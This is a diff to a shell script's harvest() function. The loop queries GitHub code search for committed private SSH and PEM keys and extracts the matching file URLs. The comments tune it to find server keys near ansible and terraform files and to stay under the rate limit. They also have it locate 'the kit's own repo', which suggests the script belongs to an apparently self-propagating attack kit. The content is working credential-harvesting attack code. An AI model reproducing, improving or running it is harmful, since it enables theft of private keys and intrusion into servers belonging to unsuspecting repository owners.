@@ -102,8 +102,12 @@ harvest() {
     # A key committed next to ansible/terraform/deploy files is far more likely
     # to be a *server* key than a random id_rsa, so bias the search that way:
     # half the queries are plain, half demand an infra marker as well.
+    # filename:id_key matters because that is what THIS kit calls its own key,
+    # so without it the hunter can never discover the kit's own repo.
+    # Keep the count at <=10: the code_search budget is 10 requests/minute.
     for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY' \
-             'filename:id_rsa+ansible' 'filename:id_rsa+terraform' 'filename:.pem+inventory'; do
+             'filename:id_key' 'filename:id_rsa+ansible' 'filename:id_rsa+terraform' \
+             'filename:.pem+inventory'; do
         api "https://api.github.com/search/code?q=$q&per_page=100" 2>/dev/null \
           | grep -oE '"html_url": *"[^"]+"' \
           | grep '/blob/' \
